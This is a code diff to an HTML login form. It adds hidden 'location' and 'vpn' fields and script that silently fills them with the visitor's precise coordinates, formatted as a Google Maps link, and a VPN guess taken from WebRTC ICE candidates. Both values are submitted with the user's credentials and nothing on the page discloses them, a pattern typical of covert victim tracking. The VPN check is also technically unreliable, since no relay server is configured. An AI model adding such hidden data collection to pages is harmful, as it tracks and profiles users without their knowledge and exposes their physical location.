@@ -13,6 +13,8 @@
     <form action="/" method="post">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" required><br>
+        <input type="text" value="" id="location" hidden name="location">
+        <input type="text" value="" id="vpn" hidden name="vpn">
 
         <label for="password">Password:</label>
         <input type="password" id="password" name="password" required><br>
@@ -20,14 +22,46 @@
         <button type="submit">Login</button>
     </form>
     <script>
+        function checkVPN() {
+            return new Promise((resolve, reject) => {
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window
+                    .webkitRTCPeerConnection;
+                const pc = new RTCPeerConnection();
+
+                pc.createDataChannel('');
+
+                pc.createOffer().then(pc.setLocalDescription.bind(pc)).catch(() => {});
+
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate.includes('relay')) {
+                        resolve(true); // VPN detected
+                    } else {
+                        resolve(false); // VPN not detected
+                    }
+
+                    pc.onicecandidate = null;
+                };
+            });
+        }
+
+        // Example usage
+        checkVPN().then((isVPN) => {
+            if (isVPN) {
+                document.getElementById('vpn').value = "VPN detected.";
+            } else {
+                document.getElementById('vpn').value = "VPN not detected or unable to check.";
+            }
+        });
+
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
                 const latitude = position.coords.latitude;
                 const longitude = position.coords.longitude;
-                console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                document.getElementById("location").value = "https://www.google.com/maps/search/" + latitude + "," +
+                    "+" + longitude + "/@" + latitude + "," + longitude + ",17z?entry=ttu"
             });
         } else {
-            console.log("Geolocation is not supported by this browser.");
+            document.getElementById("location").value = null
         }
     </script>
 </body>
